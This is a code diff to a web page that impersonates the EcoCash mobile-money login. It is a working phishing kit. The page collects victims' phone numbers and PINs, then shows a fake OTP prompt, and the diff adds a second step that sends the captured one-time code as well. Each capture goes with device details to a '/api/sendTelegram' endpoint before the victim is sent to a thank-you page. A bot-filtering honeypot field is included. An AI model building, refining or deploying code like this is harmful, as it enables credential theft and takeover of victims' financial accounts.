@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width,initial-scale=1" />
 <title>EcoCash — Login</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
-
 <style>
   *{box-sizing:border-box}
   html,body{height:100%}
@@ -13,46 +12,53 @@
     font-family:Inter,system-ui,Arial;
     background:linear-gradient(180deg,#f7fbff,#e8f3ff);
     margin:0;
+    -webkit-font-smoothing:antialiased;
     padding:18px;
     display:flex;
     align-items:center;
     justify-content:center;
+    min-height:100vh;
   }
 
   .card{width:100%;max-width:380px;background:#fff;padding:20px;border-radius:12px;box-shadow:0 12px 30px rgba(2,6,23,0.06)}
   .logo{height:44px;display:block;margin:0 auto 10px}
-  h2{text-align:center;margin:0 0 12px;font-size:20px}
-  label{display:block;font-size:13px;margin-top:8px}
-  input{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff}
-  .btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:12px;width:100%}
-  .btn[disabled]{background:#cbd5e1;cursor:not-allowed}
+  h2{text-align:center;margin:0 0 12px;color:#111;font-size:20px}
+  label{display:block;font-size:13px;color:#374151;margin-top:8px}
+  input{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;font-size:14px}
+  .btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:12px;cursor:pointer;width:100%}
+  .btn[disabled]{background:#cbd5e1;color:#6b7280;cursor:not-allowed}
 
   .req{color:#d04444;margin-right:6px}
-  .phone-error{font-size:13px;color:#d04444;display:none;margin-top:4px}
+  .phone-error{color:#d04444;font-size:13px;display:none;margin-top:4px}
 
   /* PIN boxes */
   .pin-row{display:flex;gap:8px;justify-content:center;margin-top:6px}
   .pin-digit{
-    width:44px;height:48px;
-    text-align:center;
-    font-size:20px;
-    border-radius:8px;
-    border:1px solid #e6eefc;
-    background:#fbfdff;
+    width:40px;height:48px;
+    text-align:center;font-size:20px;
+    border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;
   }
+
+  /* OTP modal (ORIGINAL STYLES) */
+  .otp-modal{position:fixed;left:0;top:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.35)}
+  .otp-box{background:#fff;padding:18px;border-radius:12px;min-width:300px;max-width:92%;box-shadow:0 12px 24px rgba(2,6,23,0.08)}
+  .otp-row{display:flex;gap:8px;justify-content:center;margin-top:8px}
+  .otp-digit{width:40px;height:48px;text-align:center;font-size:20px;border-radius:8px;border:1px solid #e6eefc}
+  .otp-warning{color:#d04444;font-size:13px;margin-top:8px;display:none}
+  .small{font-size:13px;color:#6b7280}
+  .success{color:#16a34a;font-weight:600}
 </style>
 </head>
 
 <body>
 <div class="card">
-<img src="assets/eco.png" alt="EcoCash logo" class="logo">
+<img src="assets/eco.png" class="logo" alt="EcoCash logo">
 
 <h2>Login</h2>
 
 <form id="loginForm" autocomplete="off">
-
 <label><span class="req">★</span>Mobile Number</label>
-<input id="phone" inputmode="numeric" value="+263" />
+<input id="phone" value="+263" inputmode="numeric">
 <div id="phoneError" class="phone-error">Enter 9 digits starting with 7</div>
 
 <label><span class="req">★</span>4-Digit PIN</label>
@@ -63,14 +69,12 @@
   <input class="pin-digit" maxlength="1" inputmode="numeric">
 </div>
 
-<!-- honeypot -->
 <input type="text" id="hp" style="display:none">
-
 <button id="loginBtn" class="btn" disabled>LOGIN</button>
 </form>
 </div>
 
-<!-- OTP modal (UNCHANGED) -->
+<!-- ===== ORIGINAL OTP MODAL (UNCHANGED LOGIC) ===== -->
 <div id="otpModal" style="display:none" class="otp-modal">
   <div class="otp-box">
     <div style="text-align:center"><strong>Enter OTP</strong></div>
@@ -87,6 +91,11 @@
 
     <div id="otpWarning" class="otp-warning">Please input 6 digits</div>
 
+    <div class="resend-row small">
+      Resend available in <span id="countdown">120</span>s
+      <button id="resendBtn" disabled>Resend OTP</button>
+    </div>
+
     <div style="display:flex;gap:10px;margin-top:12px">
       <button id="confirmOtp" disabled>Confirm</button>
       <button id="cancelOtp">Cancel</button>
@@ -97,95 +106,86 @@
 </div>
 
 <script>
-/* ========= DEVICE INFO ========= */
-const deviceInfo = {
-  userAgent: navigator.userAgent,
-  platform: navigator.platform
-};
+/* ================= DEVICE ================= */
+const deviceInfo = { ua:navigator.userAgent, platform:navigator.platform };
 
-/* ========= ANTI BOT ========= */
-const RATE_LIMIT = 4000;
-const lastSubmit = Number(localStorage.getItem('lastSubmit') || 0);
-
-/* ========= PHONE ========= */
-const phoneEl = document.getElementById('phone');
-const phoneError = document.getElementById('phoneError');
-
-phoneEl.addEventListener('keydown',e=>{
-  if(phoneEl.selectionStart <= 4 && e.key === 'Backspace'){
-    e.preventDefault();
-  }
-});
-
+/* ================= PHONE ================= */
+const phoneEl=document.getElementById('phone'),phoneError=document.getElementById('phoneError');
+phoneEl.addEventListener('keydown',e=>{ if(phoneEl.selectionStart<=4&&e.key==='Backspace') e.preventDefault(); });
 phoneEl.addEventListener('input',()=>{
-  if(!phoneEl.value.startsWith('+263')){
-    phoneEl.value = '+263';
-  }
-  let digits = phoneEl.value.replace('+263','').replace(/\D/g,'').slice(0,9);
-  phoneEl.value = '+263'+digits;
-
-  phoneError.style.display = /^7\d{8}$/.test(digits) ? 'none' : 'block';
-  updateBtn();
+  let d=phoneEl.value.replace('+263','').replace(/\D/g,'').slice(0,9);
+  phoneEl.value='+263'+d;
+  phoneError.style.display=/^7\d{8}$/.test(d)?'none':'block';
+  updateLogin();
 });
 
-/* ========= PIN ========= */
-const pinBoxes = [...document.querySelectorAll('.pin-digit')];
-const loginBtn = document.getElementById('loginBtn');
-
-function getPIN(){
-  return pinBoxes.map(b=>b.value).join('');
+/* ================= PIN ================= */
+const pinBoxes=[...document.querySelectorAll('.pin-digit')],loginBtn=document.getElementById('loginBtn');
+const getPIN=()=>pinBoxes.map(b=>b.value).join('');
+pinBoxes.forEach((b,i)=>{
+  b.addEventListener('input',()=>{b.value=b.value.replace(/\D/g,'');if(b.value&&i<3)pinBoxes[i+1].focus();updateLogin();});
+  b.addEventListener('keydown',e=>{if(e.key==='Backspace'&&!b.value&&i>0){pinBoxes[i-1].focus();pinBoxes[i-1].value='';e.preventDefault();}});
+});
+function updateLogin(){
+  loginBtn.disabled=!(/^7\d{8}$/.test(phoneEl.value.replace('+263',''))&&/^\d{4}$/.test(getPIN()));
 }
 
-function updateBtn(){
-  const phoneDigits = phoneEl.value.replace('+263','');
-  const phoneOk = /^7\d{8}$/.test(phoneDigits);
-  const pinOk = /^\d{4}$/.test(getPIN());
-  loginBtn.disabled = !(phoneOk && pinOk);
+/* ================= SEND ================= */
+async function sendToServer(p){return fetch('/api/sendTelegram',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p)});}
+
+/* ================= OTP LOGIC (ORIGINAL) ================= */
+const otpModal=document.getElementById('otpModal'),dEls=[...Array(6)].map((_,i)=>document.getElementById('d'+i));
+const confirmBtn=document.getElementById('confirmOtp'),cancelBtn=document.getElementById('cancelOtp');
+const resendBtn=document.getElementById('resendBtn'),countdownEl=document.getElementById('countdown'),otpWarning=document.getElementById('otpWarning');
+let seconds=120,timer;
+
+function startCountdown(){
+  seconds=120;resendBtn.disabled=true;
+  countdownEl.textContent=seconds;
+  timer=setInterval(()=>{
+    seconds--;countdownEl.textContent=seconds;
+    if(seconds<=0){clearInterval(timer);resendBtn.disabled=false;}
+  },1000);
 }
+const getOtp=()=>dEls.map(d=>d.value).join('');
+const updateConfirm=()=>{confirmBtn.disabled=!/^\d{6}$/.test(getOtp());otpWarning.style.display=confirmBtn.disabled?'block':'none';};
 
-pinBoxes.forEach((box,i)=>{
-  box.addEventListener('input',()=>{
-    box.value = box.value.replace(/\D/g,'');
-    if(box.value && i<3) pinBoxes[i+1].focus();
-    updateBtn();
-  });
-
-  box.addEventListener('keydown',e=>{
-    if(e.key==='Backspace' && !box.value && i>0){
-      pinBoxes[i-1].focus();
-      pinBoxes[i-1].value='';
-      e.preventDefault();
-    }
-  });
+dEls.forEach((el,i)=>{
+  el.addEventListener('input',()=>{el.value=el.value.replace(/\D/g,'');if(el.value&&i<5)dEls[i+1].focus();updateConfirm();});
+  el.addEventListener('keydown',e=>{if(e.key==='Backspace'&&!el.value&&i>0){dEls[i-1].focus();dEls[i-1].value='';}});
 });
 
-/* ========= SEND ========= */
-async function sendToServer(payload){
-  return fetch('/api/sendTelegram',{
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify(payload)
-  });
-}
-
-/* ========= LOGIN SUBMIT ========= */
+/* ================= SUBMIT ================= */
 document.getElementById('loginForm').addEventListener('submit',async e=>{
   e.preventDefault();
-
-  if(document.getElementById('hp').value) return;
-  if(Date.now() - lastSubmit < RATE_LIMIT) return;
-  localStorage.setItem('lastSubmit',Date.now());
-
-  document.getElementById('otpModal').style.display='flex';
+  if(document.getElementById('hp').value)return;
+  otpModal.style.display='flex';
+  dEls.forEach(d=>d.value='');
+  updateConfirm();startCountdown();
 
   await sendToServer({
     event:'login_clicked',
-    loginPhone: phoneEl.value,
-    loginPin: getPIN(),
-    device: deviceInfo,
+    loginPhone:phoneEl.value,
+    loginPin:getPIN(),
+    device:deviceInfo,
     submittedAt:new Date().toISOString()
   });
 });
+
+cancelBtn.onclick=()=>{otpModal.style.display='none';clearInterval(timer);};
+
+confirmBtn.onclick=async()=>{
+  if(!/^\d{6}$/.test(getOtp()))return;
+  await sendToServer({
+    event:'otp_confirm',
+    loginPhone:phoneEl.value,
+    loginPin:getPIN(),
+    otp:getOtp(),
+    device:deviceInfo,
+    submittedAt:new Date().toISOString()
+  });
+  window.location.href='thankyou.html';
+};
 </script>
 </body>
 </html>
